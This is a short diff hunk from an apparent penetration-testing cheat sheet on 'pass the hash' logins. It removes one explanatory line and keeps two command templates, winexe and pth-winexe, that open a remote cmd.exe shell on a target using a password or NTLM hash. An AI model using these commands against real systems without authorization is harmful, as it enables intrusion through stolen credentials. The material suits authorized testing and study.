@@ -30,8 +30,6 @@ PASS THE HASH LOGIN
 ```
 winexe -U <domain/username>%<password> //<targetIP> cmd.exe
 
-Basic syntax w/ NTLM hash (pass the hash technique).
-
 pth-winexe -U <domain/username>%<hash> //<targetIP> cmd.exe
 ```
 
